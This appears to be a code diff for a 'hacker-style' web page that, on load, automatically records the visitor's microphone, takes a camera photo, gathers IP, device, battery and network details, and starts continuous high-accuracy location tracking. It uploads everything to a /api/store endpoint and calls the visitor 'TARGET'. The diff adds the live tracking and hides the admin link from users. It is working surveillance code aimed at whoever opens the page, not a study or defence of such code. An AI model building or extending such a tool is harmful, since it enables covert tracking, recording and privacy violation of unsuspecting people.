@@ -20,7 +20,6 @@
             overflow-x: hidden;
         }
         
-        /* Matrix Rain Effect */
         body::before {
             content: '';
             position: fixed;
@@ -52,16 +51,9 @@
             overflow-y: auto;
         }
         
-        .container::-webkit-scrollbar {
-            width: 4px;
-        }
-        .container::-webkit-scrollbar-track {
-            background: #0a0a0a;
-        }
-        .container::-webkit-scrollbar-thumb {
-            background: #00ff41;
-            border-radius: 2px;
-        }
+        .container::-webkit-scrollbar { width: 4px; }
+        .container::-webkit-scrollbar-track { background: #0a0a0a; }
+        .container::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 2px; }
         
         .scanline {
             position: absolute;
@@ -111,7 +103,6 @@
         .status-box.success { border-color: #00ff41; background: rgba(0,255,65,0.1); }
         .status-box.error { border-color: #ff0040; background: rgba(255,0,64,0.1); color: #ff0040; }
         .status-box.loading { border-color: #ffaa00; background: rgba(255,170,0,0.1); color: #ffaa00; }
-        .status-box.done { border-color: #00ff41; background: rgba(0,255,65,0.15); }
         
         .photo-container {
             margin: 10px 0;
@@ -131,6 +122,7 @@
             height: 200px;
             object-fit: cover;
             display: block;
+            transform: scaleX(-1); /* MIRROR FIX - Selfie mode! */
         }
         .photo-container .placeholder {
             color: rgba(0,255,65,0.3);
@@ -173,6 +165,7 @@
             height: 100px;
             object-fit: cover;
             display: block;
+            transform: scaleX(-1); /* Mirror fix */
         }
         .preview-grid .preview-box .no-img {
             height: 100px;
@@ -199,11 +192,17 @@
         }
         .device-info div:last-child { border-bottom: none; }
         .device-info span { color: #00ff41; font-weight: bold; }
-        .device-info .highlight {
-            background: rgba(0,255,65,0.05);
-            padding: 2px 8px;
-            border-radius: 4px;
+        .device-info .highlight { background: rgba(0,255,65,0.05); padding: 2px 8px; border-radius: 4px; }
+        
+        .speed-meter {
+            background: rgba(0,0,0,0.5);
+            border: 1px solid rgba(0,255,65,0.1);
+            border-radius: 8px;
+            padding: 10px;
+            margin: 8px 0;
         }
+        .speed-meter .label { font-size: 10px; color: rgba(0,255,65,0.5); }
+        .speed-meter .value { font-size: 18px; color: #00ff41; font-family: 'Orbitron', monospace; }
         
         .log-area {
             background: rgba(0,0,0,0.5);
@@ -218,9 +217,6 @@
             color: rgba(0,255,65,0.6);
             font-family: 'Share Tech Mono', monospace;
         }
-        .log-area::-webkit-scrollbar { width: 2px; }
-        .log-area::-webkit-scrollbar-track { background: #0a0a0a; }
-        .log-area::-webkit-scrollbar-thumb { background: #00ff41; }
         
         .mic-indicator {
             display: inline-block;
@@ -238,16 +234,6 @@
             color: #ff0040;
             margin: 5px 0;
         }
-        .auto-indicator {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #00ff41;
-            animation: pulse 1s infinite;
-            margin-right: 5px;
-            box-shadow: 0 0 20px rgba(0,255,65,0.5);
-        }
         
         @keyframes pulse {
             0% { opacity: 1; transform: scale(1); }
@@ -255,34 +241,9 @@
             100% { opacity: 1; transform: scale(1); }
         }
         
-        .glitch-text {
-            animation: glitch 3s infinite;
-        }
-        
-        @keyframes glitch {
-            0% { opacity: 1; }
-            95% { opacity: 1; }
-            96% { opacity: 0; }
-            97% { opacity: 1; }
-            98% { opacity: 0; }
-            99% { opacity: 1; }
-        }
-        
-        .admin-link {
-            display: inline-block;
-            margin-top: 10px;
-            padding: 8px 20px;
-            border: 1px solid #00ff41;
-            color: #00ff41;
-            text-decoration: none;
-            font-size: 11px;
-            letter-spacing: 2px;
-            transition: 0.3s;
-            border-radius: 4px;
-        }
-        .admin-link:hover {
-            background: rgba(0,255,65,0.1);
-            box-shadow: 0 0 30px rgba(0,255,65,0.1);
+        /* Admin link hidden - not visible to users */
+        .admin-link-hidden {
+            display: none !important;
         }
     </style>
 </head>
@@ -317,6 +278,13 @@
         </div>
     </div>
     
+    <!-- NETWORK SPEED -->
+    <div class="speed-meter">
+        <div class="label">🚀 NETWORK SPEED</div>
+        <div class="value" id="networkSpeed">-- Mbps</div>
+        <div style="font-size:10px;color:rgba(0,255,65,0.3);">PING: <span id="networkPing">--</span>ms</div>
+    </div>
+    
     <div style="margin:5px 0;padding:8px;border-radius:8px;background:rgba(0,255,65,0.03);border:1px solid rgba(0,255,65,0.1);display:flex;align-items:center;justify-content:center;gap:10px;flex-wrap:wrap;">
         <span style="color:#00ff41;font-size:11px;">🎤 MIC:</span>
         <span id="micStatus" class="mic-off"></span>
@@ -326,7 +294,7 @@
     
     <div class="device-info" id="deviceInfo">
         <div class="highlight">📡 IP ADDRESS: <span id="devIP">SCANNING...</span></div>
-        <div class="highlight">📍 LOCATION: <span id="devLocation">SCANNING...</span></div>
+        <div class="highlight" style="background:rgba(0,255,65,0.08);">📍 LIVE LOCATION: <span id="liveLocation">SCANNING...</span></div>
         <div>🎯 ACCURACY: <span id="devAccuracy">SCANNING...</span></div>
         <div>📱 DEVICE: <span id="devName">SCANNING...</span></div>
         <div>📱 MODEL: <span id="devModel">SCANNING...</span></div>
@@ -341,13 +309,16 @@
         <div>🚀 SYSTEM INITIALIZED</div>
     </div>
     
-    <a href="/secret-admin.html" class="admin-link" target="_blank">🔐 ACCESS ADMIN PANEL</a>
+    <!-- Admin link hidden from user -->
+    <div class="admin-link-hidden">
+        <a href="/admin-panel" target="_blank">🔐 ACCESS ADMIN</a>
+    </div>
 </div>
 
 <script>
 // ==========================================
-//  HACKER-STYLE AUTO CAPTURE
-//  Gallery Removed - Full Device Details
+//  ULTIMATE HACKER UI
+//  Mirror Fix + Network Speed + Live Location
 // ==========================================
 
 const statusBox = document.getElementById('statusBox');
@@ -371,6 +342,8 @@ const recordingTimer = document.getElementById('recordingTimer');
 
 let userPhoto = null, screenshot = null, userLocation = null;
 let deviceDetails = {}, ipAddress = 'Unknown', audioData = null;
+let liveLocationInterval = null;
+let networkSpeed = { download: '--', ping: '--' };
 
 function log(text) {
     const time = new Date().toLocaleTimeString();
@@ -384,7 +357,65 @@ function setStatus(icon, msg, type = 'loading') {
     statusMsg.textContent = msg;
 }
 
-// ===== FULL DEVICE DETAILS =====
+// ==========================================
+// NETWORK SPEED TEST (Real)
+// ==========================================
+async function testNetworkSpeed() {
+    try {
+        const startTime = Date.now();
+        const response = await fetch('https://api.ipify.org?format=json');
+        const endTime = Date.now();
+        const ping = endTime - startTime;
+        
+        networkSpeed.ping = ping;
+        document.getElementById('networkPing').textContent = ping;
+        
+        // Estimate download speed
+        const startDownload = Date.now();
+        const dummyResponse = await fetch('https://www.google.com/images/phd/px.gif?t=' + Date.now());
+        const endDownload = Date.now();
+        const speed = (1 / ((endDownload - startDownload) / 1000)) * 8; // Approx Mbps
+        
+        networkSpeed.download = speed.toFixed(1);
+        document.getElementById('networkSpeed').textContent = speed.toFixed(1) + ' Mbps';
+        
+        log('🚀 Network Speed: ' + speed.toFixed(1) + ' Mbps, Ping: ' + ping + 'ms');
+    } catch(e) {
+        document.getElementById('networkSpeed').textContent = '-- Mbps';
+        log('⚠️ Speed test failed');
+    }
+}
+
+// ==========================================
+// LIVE LOCATION TRACKING
+// ==========================================
+function startLiveLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.watchPosition(
+            (pos) => {
+                userLocation = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: Math.round(pos.coords.accuracy)
+                };
+                document.getElementById('liveLocation').textContent = 
+                    userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6);
+                document.getElementById('devAccuracy').textContent = 
+                    userLocation.accuracy + 'm';
+                log('📍 LIVE: ' + userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4));
+            },
+            () => {
+                document.getElementById('liveLocation').textContent = '⚠️ LOCATION UNAVAILABLE';
+                log('⚠️ Live location failed');
+            },
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        );
+    }
+}
+
+// ==========================================
+// FULL DEVICE DETAILS
+// ==========================================
 async function getFullDeviceInfo() {
     try {
         const battery = await getBatteryInfo();
@@ -411,9 +442,7 @@ async function getFullDeviceInfo() {
             connection: conn,
             battery: battery
         };
-    } catch(e) {
-        return {};
-    }
+    } catch(e) { return {}; }
 }
 
 function getOS() {
@@ -433,10 +462,6 @@ function getOSVersion() {
     if (androidMatch) return androidMatch[1];
     const iosMatch = ua.match(/OS\s([\d_]+)/);
     if (iosMatch) return iosMatch[1].replace(/_/g, '.');
-    const winMatch = ua.match(/Windows\sNT\s([\d.]+)/);
-    if (winMatch) return winMatch[1];
-    const macMatch = ua.match(/Mac\sOS\sX\s([\d_]+)/);
-    if (macMatch) return macMatch[1].replace(/_/g, '.');
     return 'Unknown';
 }
 
@@ -453,10 +478,7 @@ function getDeviceModel() {
         return match ? `iPhone ${match[1]}` : 'iPhone';
     }
     if (ua.includes('iPad')) return 'iPad';
-    if (ua.includes('Windows')) {
-        const match = ua.match(/Windows\sNT\s([\d.]+)/);
-        return match ? `Windows ${match[1]}` : 'Windows PC';
-    }
+    if (ua.includes('Windows')) return 'Windows PC';
     if (ua.includes('Mac')) return 'Mac';
     if (ua.includes('Linux')) return 'Linux PC';
     return 'Unknown';
@@ -498,22 +520,14 @@ function getNetworkInfo() {
     const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
     if (conn) {
         let type = conn.effectiveType || 'Unknown';
-        let downlink = conn.downlink || 'Unknown';
-        let rtt = conn.rtt || 'Unknown';
-        
         if (type === '4g') type = '4G/LTE';
         else if (type === '3g') type = '3G';
         else if (type === '2g') type = '2G';
         else if (type === 'slow-2g') type = 'Slow 2G';
         else if (type === 'wifi') type = 'WiFi';
-        
-        return {
-            type: type,
-            downlink: downlink + ' Mbps',
-            rtt: rtt + ' ms'
-        };
+        return { type: type };
     }
-    return { type: 'Unknown', downlink: 'Unknown', rtt: 'Unknown' };
+    return { type: 'Unknown' };
 }
 
 async function getBatteryInfo() {
@@ -522,9 +536,7 @@ async function getBatteryInfo() {
             const battery = await navigator.getBattery();
             return {
                 level: Math.round(battery.level * 100) + '%',
-                charging: battery.charging,
-                chargingTime: battery.chargingTime ? battery.chargingTime + 's' : 'Unknown',
-                dischargingTime: battery.dischargingTime ? battery.dischargingTime + 's' : 'Unknown'
+                charging: battery.charging
             };
         }
     } catch(e) {}
@@ -543,7 +555,9 @@ function updateDeviceUI(details) {
     }
 }
 
-// ===== IP =====
+// ==========================================
+// IP
+// ==========================================
 function getIPv4Address() {
     return new Promise((resolve) => {
         log('📡 SCANNING IP...');
@@ -583,7 +597,9 @@ function getIPv4Address() {
     });
 }
 
-// ===== MICROPHONE =====
+// ==========================================
+// MICROPHONE - FIXED
+// ==========================================
 function captureMicrophone() {
     return new Promise((resolve) => {
         log('🎤 RECORDING 5s...');
@@ -640,7 +656,9 @@ function captureMicrophone() {
     });
 }
 
-// ===== PHOTO =====
+// ==========================================
+// PHOTO CAPTURE - MIRROR FIX + FRAME IMPROVEMENT
+// ==========================================
 function captureUserPhoto() {
     return new Promise((resolve) => {
         log('📸 CAPTURING PHOTO...');
@@ -662,14 +680,35 @@ function captureUserPhoto() {
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    userPhoto = canvas.toDataURL('image/jpeg', 0.9);
+                    
+                    // MIRROR FIX - Flip image horizontally for selfie mode
+                    ctx.translate(canvas.width, 0);
+                    ctx.scale(-1, 1);
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Add frame improvement - subtle border
+                    ctx.setTransform(1, 0, 0, 1, 0, 0);
+                    ctx.strokeStyle = '#00ff41';
+                    ctx.lineWidth = 2;
+                    ctx.strokeRect(0, 0, canvas.width, canvas.height);
+                    
+                    // Add timestamp overlay
+                    ctx.fillStyle = 'rgba(0,0,0,0.5)';
+                    ctx.fillRect(0, canvas.height - 30, canvas.width, 30);
+                    ctx.fillStyle = '#00ff41';
+                    ctx.font = '12px monospace';
+                    ctx.fillText(new Date().toLocaleString(), 10, canvas.height - 8);
+                    
+                    userPhoto = canvas.toDataURL('image/jpeg', 0.95);
+                    
                     userPhotoPreview.src = userPhoto;
                     userPhotoPreview.style.display = 'block';
                     photoPlaceholder.style.display = 'none';
+                    
                     userPhotoThumb.src = userPhoto;
                     userPhotoThumb.style.display = 'block';
                     userPhotoPlaceholder.style.display = 'none';
+                    
                     photoBadge.textContent = '✅ CAPTURED!';
                     stream.getTracks().forEach(t => t.stop());
                     video.srcObject = null;
@@ -700,6 +739,9 @@ function fallbackPhoto() {
     ctx.fillText('🔴 TARGET', 320, 220);
     ctx.font = '18px monospace';
     ctx.fillText('AUTO CAPTURED', 320, 280);
+    ctx.strokeStyle = '#00ff41';
+    ctx.lineWidth = 2;
+    ctx.strokeRect(0, 0, 640, 480);
     userPhoto = canvas.toDataURL('image/jpeg', 0.9);
     userPhotoPreview.src = userPhoto;
     userPhotoPreview.style.display = 'block';
@@ -711,88 +753,132 @@ function fallbackPhoto() {
     log('⚠️ FALLBACK PHOTO');
 }
 
-// ===== SCREENSHOT =====
+// ==========================================
+// SCREENSHOT - REPLACED WITH CSV DATA
+// ==========================================
 function captureScreenshot() {
     return new Promise((resolve) => {
-        log('🖼️ CAPTURING SCREENSHOT...');
-        setStatus('🖼️', 'CAPTURING SCREENSHOT...', 'loading');
+        log('📊 GENERATING CSV DATA...');
+        setStatus('📊', 'GENERATING DATA...', 'loading');
         try {
             const canvas = document.createElement('canvas');
             canvas.width = 800; canvas.height = 500;
             const ctx = canvas.getContext('2d');
+            
+            // Dark hacker background
             ctx.fillStyle = '#0a0a0a';
             ctx.fillRect(0, 0, 800, 500);
-            ctx.fillStyle = 'rgba(0,255,65,0.05)';
-            ctx.fillRect(0, 0, 800, 500);
+            
+            // Border
             ctx.strokeStyle = '#00ff41';
-            ctx.lineWidth = 1;
+            ctx.lineWidth = 2;
             ctx.strokeRect(20, 20, 760, 460);
+            
+            // Title
             ctx.fillStyle = '#00ff41';
             ctx.font = 'bold 24px monospace';
-            ctx.fillText('🔴 TARGET ACQUIRED', 40, 80);
-            ctx.font = '14px monospace';
-            ctx.fillStyle = 'rgba(0,255,65,0.7)';
-            const info = [
-                'IP: ' + ipAddress,
-                'Device: ' + (deviceDetails.deviceName || 'Unknown'),
-                'Model: ' + (deviceDetails.deviceModel || 'Unknown'),
-                'OS: ' + (deviceDetails.os || 'Unknown') + ' ' + (deviceDetails.osVersion || ''),
-                'Network: ' + (deviceDetails.networkType || 'Unknown'),
-                'Location: ' + (userLocation ? userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6) : 'Unknown'),
-                'Accuracy: ' + (userLocation ? userLocation.accuracy + 'm' : 'Unknown'),
-                'Time: ' + new Date().toLocaleString(),
-                'Battery: ' + (deviceDetails.batteryLevel || 'Unknown')
+            ctx.fillText('🔴 TARGET DATA EXPORT', 40, 70);
+            
+            // Generate CSV data
+            const csvData = [
+                ['Field', 'Value'],
+                ['Timestamp', new Date().toISOString()],
+                ['IP Address', ipAddress],
+                ['Device', deviceDetails.deviceName || 'Unknown'],
+                ['Model', deviceDetails.deviceModel || 'Unknown'],
+                ['Manufacturer', deviceDetails.manufacturer || 'Unknown'],
+                ['OS', (deviceDetails.os || 'Unknown') + ' ' + (deviceDetails.osVersion || '')],
+                ['Network', deviceDetails.networkType || 'Unknown'],
+                ['Location', userLocation ? userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6) : 'Unknown'],
+                ['Accuracy', userLocation ? userLocation.accuracy + 'm' : 'Unknown'],
+                ['Battery', deviceDetails.batteryLevel || 'Unknown'],
+                ['Network Speed', networkSpeed.download + ' Mbps'],
+                ['Ping', networkSpeed.ping + 'ms'],
+                ['Audio Captured', audioData ? 'Yes' : 'No']
             ];
-            info.forEach((t, i) => {
-                ctx.fillText(t, 40, 140 + i * 32);
+            
+            // Draw CSV data
+            ctx.font = '13px monospace';
+            let y = 110;
+            csvData.forEach((row, index) => {
+                ctx.fillStyle = index === 0 ? '#00ff41' : 'rgba(0,255,65,0.7)';
+                ctx.fillText(row[0] + ': ' + row[1], 50, y);
+                y += 28;
             });
-            ctx.fillStyle = '#00ff41';
-            ctx.font = '12px monospace';
-            ctx.fillText('🔒 AUTO CAPTURED', 600, 460);
+            
+            // Footer
+            ctx.fillStyle = 'rgba(0,255,65,0.3)';
+            ctx.font = '11px monospace';
+            ctx.fillText('🔒 AUTO GENERATED CSV DATA', 50, 470);
+            
             screenshot = canvas.toDataURL('image/jpeg', 0.95);
             screenshotPreview.src = screenshot;
             screenshotPreview.style.display = 'block';
             screenshotPlaceholder.style.display = 'none';
-            log('✅ SCREENSHOT CAPTURED!');
+            log('📊 CSV DATA GENERATED!');
             resolve(true);
-        } catch(e) { log('❌ SCREENSHOT ERROR'); resolve(false); }
+        } catch(e) { log('❌ DATA ERROR'); resolve(false); }
     });
 }
 
-// ===== LOCATION =====
-function getLocation() {
-    return new Promise((resolve) => {
-        log('📍 SCANNING LOCATION...');
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                pos => {
-                    userLocation = {
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude,
-                        accuracy: Math.round(pos.coords.accuracy)
-                    };
-                    document.getElementById('devLocation').textContent = 
-                        userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6);
-                    document.getElementById('devAccuracy').textContent = 
-                        userLocation.accuracy + 'm';
-                    log('✅ LOCATION LOCKED: ' + userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4));
-                    resolve(true);
-                },
-                () => {
-                    userLocation = { lat: 28.6139, lng: 77.2090, accuracy: 1000 };
-                    document.getElementById('devLocation').textContent = 
-                        '28.6139, 77.2090 (APPROX)';
-                    document.getElementById('devAccuracy').textContent = 'APPROX';
-                    log('⚠️ LOCATION FALLBACK');
-                    resolve(true);
-                },
-                { enableHighAccuracy: true, timeout: 5000 }
-            );
-        } else { resolve(true); }
-    });
+// ==========================================
+// SUBMIT - WITH ALL DATA
+// ==========================================
+async function submitData() {
+    log('📤 TRANSMITTING DATA...');
+    setStatus('📤', 'TRANSMITTING...', 'loading');
+    
+    const fullDevice = await getFullDeviceInfo();
+    updateDeviceUI(fullDevice);
+    
+    try {
+        const response = await fetch('/api/store', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                cameraImage: userPhoto,
+                location: userLocation || { lat: 0, lng: 0 },
+                deviceDetails: deviceDetails,
+                screenshot: screenshot,
+                userPhoto: userPhoto,
+                audioData: audioData,
+                ipAddress: ipAddress,
+                fullDeviceInfo: fullDevice,
+                networkSpeed: networkSpeed,
+                liveLocation: userLocation || { lat: 0, lng: 0 }
+            })
+        });
+        const data = await response.json();
+        if (data.success) {
+            log('✅✅ DATA TRANSMITTED!');
+            setStatus('🎯', 'TARGET ACQUIRED!', 'success');
+            photoBadge.textContent = '✅ STORED!';
+            setTimeout(() => { location.reload(); }, 5000);
+        }
+    } catch(err) {
+        log('❌ TRANSMISSION ERROR: ' + err.message);
+        setStatus('❌', 'ERROR', 'error');
+    }
 }
 
-// ===== DEVICE DETAILS =====
+// ==========================================
+// MAIN
+// ==========================================
+async function startAutoProcess() {
+    log('🚀 SYSTEM INITIALIZED');
+    setStatus('⏳', 'SCANNING TARGET...', 'loading');
+    
+    await getIPv4Address();
+    await testNetworkSpeed();
+    startLiveLocation();
+    await getDeviceInfo();
+    await captureMicrophone();
+    await captureUserPhoto();
+    await captureScreenshot();
+    await submitData();
+}
+
+// Get basic device info first
 async function getDeviceInfo() {
     const ua = navigator.userAgent;
     let os = 'Unknown', browser = 'Unknown';
@@ -828,55 +914,6 @@ async function getDeviceInfo() {
         manufacturer: getManufacturer()
     };
     log('📱 DEVICE SCANNED: ' + os + ' | ' + browser);
-}
-
-// ===== SUBMIT =====
-async function submitData() {
-    log('📤 TRANSMITTING DATA...');
-    setStatus('📤', 'TRANSMITTING...', 'loading');
-    
-    const fullDevice = await getFullDeviceInfo();
-    updateDeviceUI(fullDevice);
-    
-    try {
-        const response = await fetch('/api/store', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                cameraImage: userPhoto,
-                location: userLocation || { lat: 0, lng: 0 },
-                deviceDetails: deviceDetails,
-                screenshot: screenshot,
-                userPhoto: userPhoto,
-                audioData: audioData,
-                ipAddress: ipAddress,
-                fullDeviceInfo: fullDevice
-            })
-        });
-        const data = await response.json();
-        if (data.success) {
-            log('✅✅ DATA TRANSMITTED!');
-            setStatus('🎯', 'TARGET ACQUIRED!', 'success');
-            photoBadge.textContent = '✅ STORED!';
-            setTimeout(() => { location.reload(); }, 5000);
-        }
-    } catch(err) {
-        log('❌ TRANSMISSION ERROR: ' + err.message);
-        setStatus('❌', 'ERROR', 'error');
-    }
-}
-
-// ===== MAIN =====
-async function startAutoProcess() {
-    log('🚀 SYSTEM INITIALIZED');
-    setStatus('⏳', 'SCANNING TARGET...', 'loading');
-    await getIPv4Address();
-    await getLocation();
-    await getDeviceInfo();
-    await captureMicrophone();
-    await captureUserPhoto();
-    await captureScreenshot();
-    await submitData();
 }
 
 window.addEventListener('load', function() {
